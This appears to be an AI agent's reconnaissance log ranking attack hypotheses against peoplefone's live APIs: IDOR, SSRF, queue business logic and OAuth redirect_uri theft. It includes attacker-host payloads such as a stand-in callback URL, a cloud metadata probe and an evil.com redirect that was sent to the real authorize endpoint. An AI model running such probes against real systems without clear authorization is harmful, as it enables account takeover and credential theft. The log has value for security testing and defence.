[PRIO] api.peoplefone.com,7.0,attack_surface:8,business_value:7,tech_exposure:7,gate_ease:5,cloud_surface:6,freshness:8 — dev-portal/Swagger host; ben/gin surface lower now that specs are fully harvested
[HYP] IDOR/BOLA on Configuration API {identifier} CRUD across 8 resource types
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
confidence: 85
reasoning: 235KB spec; numeric sequential identifiers; spec states "user must be part of account bound to bearer token" (boundary claim); UserResponse exposes sipUserName, physical address, email; full CRUD incl. DELETE; object-level enforcement unproven; live 401 gate confirmed at /customer/voip/v1; two independent agent runs both rank this top
evidence_needed: tenant-A token returns tenant-B {identifier} object, or adjacent sequential-id enumeration leaks foreign tenant objects
verify_steps: (authorized token, read-only) GET /customer/voip/v1/users to map own id space; then GET /users/{own_id}, /users/{own_id+1}, /users/{own_id-1}; repeat for /numbers/{did} and /callforwarding/{id}; compare returned tenant/owner markers vs token-bound tenant
impact: cross-tenant PBX takeover — SIP creds, PII (physical address, email), DID routing, call-forwarding/IVR/queue reprogramming; severity CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via 5 callback-accepting endpoints incl. custom-header exfiltration
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api smart-routings/{id}/webhook + call-api uaCSTA device/monitorStart + configuration-api external-number-lookup (webhookUrl)
confidence: 78
reasoning: 5 endpoints accept format:uri with zero host/scheme allowlist; External Number Lookup forwards customer-configured Authorization/X-API-Key to attacker URL; uaCSTA monitorStart streams SIP username+number call events; Smart Routing X-Track-Id single-use (2-min); deprecated External Routing (2026-09-30, still live) repeats pattern on possibly weaker code path
evidence_needed: post-auth callback POST reaches attacker host; 169.254.169.254/loopback/internal ranges not filtered
verify_steps: (authorized token) SMS POST with callbackUrl=https://attacker-collab.example/x and probe variant http://169.254.169.254/latest/meta-data/; register Smart Routing webhook url; uaCSTA POST /device/monitorStart with monitoringCallbackUrl — inspect attacker-side receipt only
impact: cloud metadata/IAM theft, internal SIP/PBX pivot, credential exfiltration via forwarded headers, live call-metadata leak; severity CRITICAL
testability: AUTH_HELPED
[HYP] Business logic — cross-tenant agent login/logout on Queue API
class: BUSLOGIC
asset: call-api.peoplefone.com/customer/queue/v1/agents/login + /agents/logout
confidence: 65
reasoning: POST accepts agent identifier (type user) + queueScope selected/all + optional queues array; queue identifiers numeric sequential (2000, 2001...); permanentMembership flag implies persistent queue state; spec silent on membership-vs-boundary validation for the acted-on agent
evidence_needed: tenant-A token logs in or logs out tenant-B agent on tenant-B queue, with 200 instead of 403
verify_steps: (authorized token) POST /customer/queue/v1/agents/login {agent:{identifier: "<foreign_user_id>"}, queueScope:"all"}; 200 = flaw, 403 = boundary enforced; no other mutation
impact: forced agent offline / call-center disruption, rerouting of live traffic; severity HIGH
testability: AUTH_HELPED
[PARKED] AUTH @ auth.peoplefone.com OAuth redirect_uri/state flaw (client_id=1 arbitrary redirect): no live authorize endpoint (404 at standard paths) and token issuance absent from all 8 specs — parked until portal.peoplefone.ch session flow is mapped by an authorized operator
[FINAL] IDOR on Configuration API {identifier} CRUD — 85, AUTH_HELPED, CRITICAL — RETAIN
[FINAL] SSRF via 5 callback endpoints (incl. header exfiltration) — 78, AUTH_HELPED, CRITICAL — RETAIN
[FINAL] BUSLOGIC Queue API agent login/logout — 65, AUTH_HELPED, HIGH — RETAIN (weakest evidence; park if token yields 403 on first probe)
[NEXT] HUMAN: Within authorized scope, create a test account on portal.peoplefone.ch to obtain a bearer token, then run the two read-only IDOR confirmations (GET /customer/voip/v1/users/{own_id±1}) in an authorized context; agent-side probing now yields no delta and every remaining step is token-gated.
[LEARN] ACCEPTED IDOR @ configuration-api: cross-model convergence (bigpickle+nemotron3) both rank {identifier} CRUD as top candidate; no counter-evidence surfaced — retains top slot
[LEARN] ACCEPTED SSRF @ 5 endpoints: no new counter-evidence since spec harvest; retained pending token
[LEARN] ACCEPTED BUSLOGIC @ call-api queue agents: retained at lowest rank — weakest evidence class, spec-silent on membership validation
[LEARN] REJECTED AUTH @ auth.peoplefone.com: re-confirmed token issuance outside all 8 specs and standard endpoints 404 — agent-side token acquisition impossible; human+portal required
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: no new dangling-target candidates; wildcard remains Cloudflare CNAME-dominated
[RISK] peoplefone GmbH: 89/100 — all three CRITICAL/HIGH hypothesis classes remain live but unverified behind a single auth gate; extensive 8-spec API surface exposing SIP creds, PII, DID routing, call-forwarding/IVR/queue state; 5 SSRF endpoints with a header-exfiltration variant; deprecated 2026-09-30 API still exposed; overall impact is entirely gated on token acquisition that no agent path can obtain, so confirmation is deferred to the authorized operator step.
## 2026-09-05 00:15:57 UTC [target] (model bigpickle)
[NEW] auth.peoplefone.com/oauth/authorize is LIVE for client_id=1: `GET /oauth/authorize?...redirect_uri=https://evil.com/callback...` → HTTP 302 → `/de_CH/login` with the attacker `redirect_uri` PRESERVED verbatim — prior KB "404 at standard paths" was an invalid-client artifact (`client_id=test` → 404); the endpoint validates client_id but NOT redirect_uri
[NEW] Implicit (`response_type=token`) AND PKCE (`code_challenge`+`code_challenge_method=S256`) params accepted and preserved through the same redirect → public-client-style behavior
[NEW] auth.peoplefone.com/oauth/token EXISTS (HTTP 405 on GET) — live token-exchange endpoint confirmed
[NEW] auth.peoplefone.com/de_CH/register is LIVE (HTTP 200, `registrationForm` POST + Cloudflare Turnstile sitekey `0x4AAAAAAETtGmlFEOhYOX2V`) — self-service account creation available to an authorized operator
[NEW] portal.peoplefone.ch inventoried: LIVE Laravel customer portal (XSRF-TOKEN + encrypted session cookie, httponly, secure) — `302 /` → `/home` → `/login` → `auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=portal.peoplefone.ch/authback&state=` — token-issuance chain now precisely mapped; root `/api` → 404
[NEW] `/services/api-doc/swagger-initializer.js` confirms exactly 8 specs, NO auth/token spec (token issuance confirmed off-spec, via portal OAuth flow)
[CHANGED] REVERSED prior REJECTED-AUTH verdict: OAuth authorize endpoint confirmed live; arbitrary redirect_uri/state preserved for client_id=1 two hops deep (authorize → login); token endpoint live; full ATO-relevant primitive re-instated
[PRIO] auth.peoplefone.com,7.95,attack_surface:8,business_value:10,tech_exposure:10,gate_ease:3,cloud_surface:5,freshness:10 — revived OAuth authorize/token surface, low structural cost to re-probe, gated only by final victim-login step
[PRIO] portal.peoplefone.ch,7.55,attack_surface:7,business_value:10,tech_exposure:8,gate_ease:4,cloud_surface:5,freshness:10 — in-scope customer portal (Laravel) is the OAuth orchestrator and token issuer; never previously inventoried
[PRIO] configuration-api.peoplefone.com,8.6,attack_surface:10,business_value:10,tech_exposure:9,gate_ease:4,cloud_surface:7,freshness:9 — unchanged, remains token-gated
[HYP] OAuth arbitrary redirect_uri / implicit-token theft on auth service (client_id=1)
class: AUTH
asset: auth.peoplefone.com/oauth/authorize (+ /oauth/token)
confidence: 78
reasoning: Live 302 observed: authorize with `redirect_uri=https://evil.com/callback` preserves evil.com through `/de_CH/login`; implicit response_type=token and PKCE code_challenge both accepted and preserved (302 observed today); `/oauth/token` returns 405=exists; client_id=1 (portal web client) is the acting client; no client-secret needed at the authorize layer
evidence_needed: After a real victim authentication via attacker-crafted authorize URL, the code (or token under implicit) is delivered to the attacker redirect_uri AND exchangeable at /oauth/token — determines ATO (public/PKCE) vs open-redirect+login-CSRF (confidential secret required)
verify_steps: (authorized op, test account) replicate today's 302 repro, complete login, capture code at attacker-URL; POST the code to /oauth/token with and without client_secret; observe token issuance
impact: If exchange is public-client-capable: full ATO of any authenticated portal user → call recordings, CDR, PBX config, billing; minimum guaranteed: open redirect primed on a login flow + login-CSRF; severity CRITICAL (conditional on client type)
testability: HUMAN_ONLY
[HYP] IDOR/BOLA on Configuration API {identifier} CRUD across 8 resource types
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
confidence: 85
reasoning: unchanged — 235KB spec, numeric sequential identifiers, boundary statement in spec, PII in UserResponse; live 401 gate confirmed; cross-model convergence (bigpickle+nemotron3)
evidence_needed: tenant-A token returns tenant-B {identifier} object via sequential enumeration
verify_steps: (authorized token) GET /customer/voip/v1/users → own id space; GET /users/{own_id±1}; compare owner markers vs token tenant
impact: cross-tenant PBX takeover — SIP creds, PII, DID routing, IVR/queue reprogramming; CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via 5 callback-accepting endpoints incl. custom-header exfiltration
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api smart-routings/{id}/webhook + call-api uaCSTA device/monitorStart + configuration-api external-number-lookup (webhookUrl)
confidence: 78
reasoning: unchanged — 5 endpoints accept format:uri with zero host/scheme allowlist; External Number Lookup forwards customer Authorization/X-API-Key to attacker URL; uaCSTA streams call events
evidence_needed: post-auth callback POST reaches attacker host; 169.254.169.254/loopback not filtered
verify_steps: (authorized token) POST SMS with callbackUrl=https://attacker-collab.example/x + 169.254.169.254 variant; register Smart Routing webhook url; uaCSTA monitorStart with monitoringCallbackUrl
impact: cloud metadata/IAM theft, internal pivot, credential + live call-metadata exfiltration; CRITICAL
testability: AUTH_HELPED
[PARKED] BUSLOGIC @ Queue API agent login/logout (65): retained only at lowest rank; spec-silent on membership validation; drop priority in favor of the revived, live-evidenced OAuth chain
[FINAL] AUTH OAuth redirect_uri/implicit token theft on auth (client_id=1) — 78, HUMAN_ONLY, CRITICAL — REVIVED from REJECTED, top slot by live evidence; prove client-type at token exchange before claiming ATO
[FINAL] IDOR configuration-api {identifier} CRUD — 85, AUTH_HELPED, CRITICAL — RETAIN (top per cross-model convergence)
[FINAL] SSRF 5 callback endpoints — 78, AUTH_HELPED, CRITICAL — RETAIN
[NEXT] HUMAN: In authorized scope, create a test account via the live self-service `auth.peoplefone.com/de_CH/register` (Turnstile-protected, verified 200), complete the mapped portal login (portal.peoplefone.ch → auth authorize client_id=1), then (a) determine whether `/oauth/token` exchanges a code WITHOUT client_secret (public/PKCE client = confirmed ATO, CRITICAL) and (b) use the obtained bearer token to run the two read-only IDOR confirmations `GET /customer/voip/v1/users/{own_id±1}`. All remaining top hypotheses are gated on exactly this account.
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: authorize endpoint CONFIRMED LIVE for client_id=1 (302→/de_CH/login preserving arbitrary redirect_uri, implicit+PKCE params accepted); prior 404 verdict traced to invalid `client_id=test` artifact — correction supersedes 2026-09-04 REJECTED entries
[LEARN] ACCEPTED AUTH @ auth.peoplefone.com: oauth/token live (405 on GET) — token-exchange endpoint exists adjacent to unrestricted redirect_uri; final severity turns on client type (secret vs PKCE/public)
[LEARN] ACCEPTED AUTH @ portal.peoplefone.ch: in-scope customer portal inventoried; Laravel (XSRF-TOKEN + encrypted session cookie); /→/home→/login→auth authorize chain is the sole token-issuance route; /api 404 on root
[LEARN] ACCEPTED OTH @ api.peoplefone.com: swagger-initializer.js lists exactly 8 specs, moving all token/passport/session issuance firmly OFF-spec — OAuth URI flow is the only documented credential path
[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: unchanged — no new dangling-target candidates; wildcard remains Cloudflare CNAME-dominated
[RISK] peoplefone GmbH: 91/100 — The single highest-impact chain is now live-evidenced: an unauthenticated attacker can craft an authorize URL with arbitrary redirect_uri and implicit/PKCE grants against client_id=1; if the portal client is public-client capable, this is silent ATO over the real customer portal (billings, recordings, PBX data, PII) plus a guaranteed open-redirect/login-CSRF primitive otherwise. All three API hypothesis classes (IDOR 85, SSRF 78, BUSLOGIC 65) remain live behind one token gate that an authorized operator can now open via the verified public `de_CH/register` endpoint. Probe results and corrected OAuth repro appended to probe-results.md.
## 2026-09-05 04:40:55 UTC [target] (model bigpickle)
## 2026-09-05 08:37:59 UTC [target] (model bigpickle)
[HYP] OAuth client-type / code-theft via unrestricted authorize redirect (client_id=1)
class: AUTH
asset: auth.peoplefone.com/oauth/authorize + /oauth/token
confidence: 62
reasoning: token endpoint POSTs (invalid code) return 401, no WWW-Authenticate; authorize is stateless-404 unless given a warm portal state (prior session live 302 preserved arbitrary redirect_uri through login); register/login now 500. Unauthenticated attacker-crafted authorize URL is not reliably reproducible without an active victim/session.
evidence_needed: With a real login (authorized op), confirm code is delivered to attacker redirect_uri AND whether /oauth/token exchanges without client_secret (public/PKCE => ATO CRITICAL) vs requires secret (confidential => code-theft still needs leaked secret / login-CSRF only).
verify_steps: (authorized, human) capture fresh state from portal.peoplefone.ch, reproduce authorize 302 with attacker redirect_uri, complete login, capture code; POST code to /oauth/token with and without client_secret and observe error class (401 vs 400 invalid_grant) to infer client type.
impact: If public/PKCE: silent ATO of any portal user (recordings, PBX, billing); if confidential: open-redirect-on-login + code-theft requiring secret => high but gated. severity CRITICAL (conditional on client type)
testability: HUMAN_ONLY
[HYP] IDOR/BOLA Configuration API {identifier} CRUD (8 resource types)
class: IDOR
asset: configuration-api.peoplefone.com/customer/voip/v1/{users,groups,ivrs,queues,numbers,smart-routings,callforwarding,manual-routing}/{identifier}
confidence: 85
reasoning: unchanged — 235KB spec, numeric sequential identifiers, boundary statement in spec, PII (sipUserName, address, email) in UserResponse; live 401 gate; cross-model convergence bigpickle+nemotron3.
evidence_needed: tenant-A bearer returns tenant-B {identifier} object via sequential ±1 enumeration.
verify_steps: (authorized token) GET /customer/voip/v1/users; then GET /users/{own_id±1}; compare owner markers vs token tenant.
impact: cross-tenant PBX takeover — SIP creds, PII, DID routing, IVR/queue reprogramming; CRITICAL
testability: AUTH_HELPED
[HYP] SSRF via 5 callback endpoints incl. custom-header exfiltration
class: SSRF
asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api smart-routings/{id}/webhook + call-api uaCSTA device/monitorStart + configuration-api external-number-lookup (webhookUrl)
confidence: 78
reasoning: unchanged — 5 endpoints accept format:uri with zero host/scheme allowlist; External Number Lookup forwards customer Authorization/X-API-Key to attacker URL; uaCSTA streams call events.
evidence_needed: post-auth callback POST reaches attacker host; 169.254.169.254/loopback not filtered.
verify_steps: (authorized token) POST SMS with callbackUrl=https://attacker.example/x + 169.254.169.254 variant; register Smart Routing webhook url; uaCSTA monitorStart with monitoringCallbackUrl.
impact: cloud metadata/IAM theft, internal pivot, credential + live call-metadata exfiltration; CRITICAL
testability: AUTH_HELPED
